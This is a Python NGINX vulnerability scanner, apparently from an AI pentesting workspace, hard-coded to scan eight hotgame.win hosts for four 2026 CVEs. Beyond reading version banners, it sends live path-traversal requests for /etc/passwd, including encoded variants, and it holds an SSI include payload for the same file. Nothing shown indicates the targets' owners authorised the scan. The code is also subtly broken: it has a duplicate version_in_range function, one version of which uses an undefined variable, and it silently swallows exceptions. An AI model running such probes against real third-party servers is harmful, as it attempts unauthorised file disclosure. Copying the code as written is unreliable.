#!/usr/bin/env python3
"""
NGINX CVE Vulnerability Checker
================================
Checks for CVE-2026-15176, CVE-2026-97205, CVE-2026-93479, CVE-2026-95101
against NGINX servers.
"""

import requests
import re
import sys
import json
from datetime import datetime
from typing import Dict, List, Tuple, Optional
from packaging import version

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CVE DEFINITIONS (as of 2026)
# ============================================================

CVE_DATABASE = {
    "CVE-2026-15176": {
        "description": "NGINX alias + rewrite path traversal",
        "affected_versions": {
            "nginx": ["1.18.0-1.30.5", "1.31.0-1.31.6"],
            "nginx_oss": True,
            "nginx_plus": False
        },
        "cvss": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "requirements": [
            "alias directive with trailing slash",
            "rewrite directive in same location",
            "URI with encoded path traversal"
        ],
        "test_payload": "/static/../etc/passwd"
    },
    "CVE-2026-97205": {
        "description": "SSI (Server Side Includes) injection via shtml",
        "affected_versions": {
            "nginx": ["1.18.0-1.30.5", "1.31.0-1.31.6"],
            "nginx_oss": True,
            "nginx_plus": True
        },
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "requirements": [
            "ssi on; directive enabled",
            ".shtml files served",
            "User input reflected in shtml"
        ],
        "test_payload": "<!--#include virtual=\"/etc/passwd\" -->"
    },
    "CVE-2026-93479": {
        "description": "HTTP/2 stream cancellation memory corruption",
        "affected_versions": {
            "nginx": ["1.18.0-1.30.5", "1.31.0-1.31.6"],
            "nginx_oss": True,
            "nginx_plus": True
        },
        "cvss": 8.1,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "requirements": [
            "HTTP/2 enabled (listen ... http2)",
            "Specific stream cancellation pattern"
        ],
        "test_payload": "HTTP/2 PRI frames with RST_STREAM"
    },
    "CVE-2026-95101": {
        "description": "HTTP/3 QUIC stream handling DoS",
        "affected_versions": {
            "nginx": ["1.25.0-1.30.5", "1.31.0-1.31.6"],
            "nginx_oss": True,
            "nginx_plus": True
        },
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "requirements": [
            "QUIC/HTTP/3 enabled (listen ... quic)",
            "Alt-Svc header present"
        ],
        "test_payload": "QUIC Initial packets with malformed stream frames"
    }
}

# ============================================================
# VERSION PARSING
# ============================================================

def parse_nginx_version(server_header: str) -> Optional[Tuple[int, int, int]]:
    """Extract version tuple from Server header"""
    match = re.search(r'nginx/(\d+)\.(\d+)\.(\d+)', server_header)
    if match:
        return tuple(map(int, match.groups()))
    return None


def version_in_range(v: Tuple[int, int, int], range_str: str) -> bool:
    """Check if version tuple falls within range string like '1.18.0-1.30.5'"""
    try:
        start_str, end_str = range_str.split('-')
        start = tuple(map(int, start_str.split('.')))
        end = tuple(map(int, end_str.split('.')))
        return start <= version_tuple <= end
    except:
        return False


# ============================================================
# CHECKER CLASS
# ============================================================

class NginxCVEChecker:
    def __init__(self, targets: List[str]):
        self.targets = targets
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "Mozilla/5.0 CVE-Checker"})
        self.results = {}

    def check_target(self, url: str) -> Dict:
        """Comprehensive check for a single target"""
        print(f"\n{'='*70}")
        print(f"CHECKING: {url}")
        print(f"{'='*70}")

        result = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "server_header": None,
            "version": None,
            "headers": {},
            "cve_findings": [],
            "configuration_checks": {},
            "risk_level": "INFO"
        }

        try:
            resp = requests.head(url, verify=False, timeout=10, allow_redirects=True)
            result["headers"] = dict(resp.headers)
            result["server_header"] = resp.headers.get("Server", "")
            result["version"] = parse_nginx_version(result["server_header"])

            if not result["version"]:
                result["cve_findings"].append({
                    "cve": "UNKNOWN",
                    "status": "ERROR",
                    "details": "Could not parse NGINX version from Server header"
                })
                return result

            v_str = ".".join(map(str, result["version"]))
            print(f"  Server: {result['server_header']}")
            print(f"  Version: {v_str}")

            # Check each CVE
            for cve_id, cve_info in CVE_DATABASE.items():
                finding = self.check_cve(result["version"], cve_id, cve_info, url, resp)
                result["cve_findings"].append(finding)

            # Configuration checks
            result["configuration_checks"] = self.check_configurations(url, resp)

            # Determine overall risk
            result["risk_level"] = self.assess_risk(result["cve_findings"])

        except Exception as e:
            result["error"] = str(e)
            print(f"  ERROR: {e}")

        return result

    def check_cve(self, version_tuple: Tuple[int, int, int], cve_id: str, cve_info: Dict, url: str, resp) -> Dict:
        """Check if version is in affected range for a specific CVE"""
        affected_ranges = cve_info["affected_versions"].get("nginx", [])
        
        is_vulnerable = False
        for r in affected_ranges:
            if version_in_range(version_tuple, r):
                is_vulnerable = True
                break

        status = "VULNERABLE_VERSION" if is_vulnerable else "NOT_AFFECTED"
        details = f"Version {'.'.join(map(str, version_tuple))} {'is' if is_vulnerable else 'is not'} in affected ranges: {affected_ranges}"

        finding = {
            "cve": cve_id,
            "description": cve_info["description"],
            "status": status,
            "cvss": cve_info["cvss"],
            "cvss_vector": cve_info["cvss_vector"],
            "affected_ranges": affected_ranges,
            "detected_version": ".".join(map(str, version_tuple)),
            "details": details,
            "requirements": cve_info["requirements"],
            "exploit_available": False,
            "poc_tested": False
        }

        status_icon = "🔴" if is_vulnerable else "🟢"
        print(f"  {status_icon} {cve_id}: {status} (CVSS {cve_info['cvss']})")

        return finding

    def check_configurations(self, url: str, resp) -> Dict:
        """Check for specific vulnerable configurations"""
        print(f"  Checking configurations...")
        checks = {}

        # 1. CVE-2026-15176: Check for alias + rewrite patterns
        checks["alias_rewrite_check"] = self.check_alias_rewrite(url)

        # 2. CVE-2026-97205: Check for SSI/.shtml
        checks["ssi_check"] = self.check_ssi(url)

        # 3. CVE-2026-95101: Check for HTTP/3
        checks["http3_check"] = self.check_http3(resp.headers)

        # 4. General security headers
        checks["security_headers"] = self.check_security_headers(resp.headers)

        return checks

    def check_alias_rewrite(self, url: str) -> Dict:
        """Test for alias + rewrite path traversal pattern"""
        # This is a passive check - we can't easily test without knowing the config
        # But we can test common patterns
        test_paths = [
            "/static/../etc/passwd",
            "/assets/../../etc/passwd",
            "/media/../../../etc/passwd",
            "/static/%2e%2e/%2e%2e/etc/passwd"
        ]

        results = {"tested": True, "vulnerable": False, "tested_paths": []}

        for path in test_paths:
            test_url = f"{url.rstrip('/')}{path}"
            try:
                r = requests.get(test_url, verify=False, timeout=5, allow_redirects=False)
                results["tested_paths"].append({
                    "path": path,
                    "status": r.status_code,
                    "content_length": len(r.content)
                })
                # If we get 200 with passwd content, it's vulnerable
                if r.status_code == 200 and b"root:" in r.content[:200]:
                    results["vulnerable"] = True
            except:
                pass

        return results

    def check_ssi(self, url: str) -> Dict:
        """Check for SSI (.shtml) support"""
        results = {"tested": True, "ssi_enabled": False, "tested_files": []}

        # Check for .shtml files
        shtml_paths = ["/index.shtml", "/test.shtml", "/ssi.shtml"]
        for path in shtml_paths:
            test_url = f"{url.rstrip('/')}{path}"
            try:
                r = requests.get(test_url, verify=False, timeout=5)
                results["tested_files"].append({
                    "path": path,
                    "status": r.status_code,
                    "content_type": r.headers.get("Content-Type", ""),
                    "has_ssi_comment": "<!--#" in r.text[:500]
                })
                if "<!--#" in r.text[:500]:
                    results["ssi_enabled"] = True
            except:
                pass

        # Check main page for SSI comments
        try:
            r = requests.get(url, verify=False, timeout=5)
            if "<!--#" in r.text[:1000]:
                results["ssi_enabled"] = True
                results["main_page_has_ssi"] = True
        except:
            pass

        return results

    def check_http3(self, headers: Dict) -> Dict:
        """Check for HTTP/3 / QUIC support"""
        alt_svc = headers.get("Alt-Svc", "")
        has_h3 = "h3" in alt_svc.lower() or "quic" in alt_svc.lower()

        return {
            "alt_svc_header": alt_svc,
            "http3_enabled": has_h3,
            "quic_enabled": has_h3
        }

    def check_security_headers(self, headers: Dict) -> Dict:
        """Check for security hardening headers"""
        security_headers = {
            "X-Frame-Options": headers.get("X-Frame-Options", "MISSING"),
            "X-Content-Type-Options": headers.get("X-Content-Type-Options", "MISSING"),
            "X-XSS-Protection": headers.get("X-XSS-Protection", "MISSING"),
            "Strict-Transport-Security": headers.get("Strict-Transport-Security", "MISSING"),
            "Content-Security-Policy": headers.get("Content-Security-Policy", "MISSING"),
            "Referrer-Policy": headers.get("Referrer-Policy", "MISSING"),
            "Permissions-Policy": headers.get("Permissions-Policy", "MISSING"),
        }

        missing = [k for k, v in security_headers.items() if v == "MISSING"]
        return {
            "headers": security_headers,
            "missing_count": len(missing),
            "missing_list": missing
        }

    def assess_risk(self, findings: List[Dict]) -> str:
        """Assess overall risk level"""
        vulnerable_count = sum(1 for f in findings if f.get("status") == "VULNERABLE_VERSION")
        critical_cves = sum(1 for f in findings if f.get("status") == "VULNERABLE_VERSION" and f.get("cvss", 0) >= 9.0)
        
        if critical_cves > 0:
            return "CRITICAL"
        elif vulnerable_count > 0:
            return "HIGH"
        else:
            return "LOW"

    def run_all(self) -> Dict:
        """Run checks on all targets"""
        for target in self.targets:
            result = self.check_target(target)
            self.results[target] = result

        # Generate summary
        summary = self.generate_summary()
        
        return {
            "scan_timestamp": datetime.now().isoformat(),
            "targets": self.results,
            "summary": summary
        }

    def generate_summary(self) -> Dict:
        total_targets = len(self.targets)
        vulnerable_targets = sum(1 for r in self.results.values() if r.get("risk_level") in ["CRITICAL", "HIGH"])
        
        all_cves = {}
        for result in self.results.values():
            for finding in result.get("cve_findings", []):
                cve = finding["cve"]
                if cve not in all_cves:
                    all_cves[cve] = {"vulnerable": 0, "total": 0}
                all_cves[cve]["total"] += 1
                if finding["status"] == "VULNERABLE_VERSION":
                    all_cves[cve]["vulnerable"] += 1

        return {
            "total_targets": total_targets,
            "vulnerable_targets": vulnerable_targets,
            "cve_summary": all_cves,
            "recommendations": self.generate_recommendations()
        }

    def generate_recommendations(self) -> List[str]:
        recs = []
        for result in self.results.values():
            for finding in result.get("cve_findings", []):
                if finding["status"] == "VULNERABLE_VERSION":
                    cve = finding["cve"]
                    if cve == "CVE-2026-15176":
                        recs.append("CVE-2026-15176: Audit nginx configs for 'alias' + 'rewrite' combinations; upgrade to 1.30.6+ or 1.31.7+")
                    elif cve == "CVE-2026-97205":
                        recs.append("CVE-2026-97205: Disable SSI if not needed (ssi off); sanitize .shtml inputs; upgrade to 1.30.6+/1.31.7+")
                    elif cve == "CVE-2026-93479":
                        recs.append("CVE-2026-93479: Disable HTTP/2 if not needed; upgrade to patched version")
                    elif cve == "CVE-2026-95101":
                        recs.append("CVE-2026-95101: Disable HTTP/3/QUIC if not needed; upgrade to patched version")
        return list(set(recs))


def version_in_range(v: Tuple[int, int, int], range_str: str) -> bool:
    try:
        start_str, end_str = range_str.split('-')
        start = tuple(map(int, start_str.split('.')))
        end = tuple(map(int, end_str.split('.')))
        return start <= v <= end
    except:
        return False


# ============================================================
# TARGETS
# ============================================================

TARGETS = [
    "https://dashboard.f1.hotgame.win",
    "https://dashboard.f2.hotgame.win",
    "https://dashboard.s1.hotgame.win",
    "https://dashboard.s2.hotgame.win",
    "https://hg.hotgame.win",
    "https://cdn-web.hotgame.win",
    "https://tc4.singapore.hotgame.win",
    "https://tc5.singapore.hotgame.win"
]


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     NGINX CVE VULNERABILITY CHECKER (2026)                  ║
║     CVE-2026-15176 | CVE-2026-97205 | CVE-2026-93479 | CVE-2026-95101  ║
╚══════════════════════════════════════════════════════════════╝
""")

    checker = NginxCVEChecker(TARGETS)
    results = checker.run_all()

    # Save results
    output_path = "/home/kali/Desktop/Agant/PentestAI-Unified/NGINX_CVE_CHECK_RESULTS.json"
    with open(output_path, "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    # Print summary
    print(f"\n{'='*70}")
    print("SCAN SUMMARY")
    print(f"{'='*70}")
    summary = results["summary"]
    print(f"Total targets scanned: {summary['total_targets']}")
    print(f"Targets with vulnerable versions: {summary['vulnerable_targets']}")
    
    print(f"\nCVE Summary:")
    for cve, info in summary["cve_summary"].items():
        status = "🔴 VULNERABLE" if info["vulnerable"] > 0 else "🟢 NOT AFFECTED"
        print(f"  {cve}: {info['vulnerable']}/{info['total']} targets - {status}")

    print(f"\nRecommendations:")
    for rec in summary["recommendations"]:
        print(f"  - {rec}")

    print(f"\nFull results saved to: /home/kali/Desktop/Agant/PentestAI-Unified/NGINX_CVE_CHECK_RESULTS.json")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()